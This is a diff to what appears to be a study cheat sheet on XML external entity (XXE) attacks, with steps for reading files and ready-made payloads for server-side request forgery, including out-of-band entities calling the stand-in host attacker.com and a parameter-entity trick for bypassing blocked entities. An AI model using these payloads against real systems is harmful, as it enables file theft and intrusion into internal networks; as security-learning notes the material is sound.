@@ -16,7 +16,7 @@
 
 </details>
 
-## Exploiting XXE to retrieve files
+## Retrieve files
 
 1. Introduce (or edit) a DOCTYPE element defining an external entity with the file path.
 2. Edit a data value in the XML returned in the app's response to use the defined external entity.
@@ -34,10 +34,7 @@
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 
-## Exploiting XXE to perform SSRF attacks
-
-* Reflected SSRF
-* Bind SSRF
+## Perform SSRF attacks
 
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
@@ -50,6 +47,9 @@
 **Detection**
 
 * Detecting as SSRF
+  * ```xml
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/"> ]>
+    ```
 * Regular entities are blocked? Bypass via XML parameter entities
   * ```xml
     <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
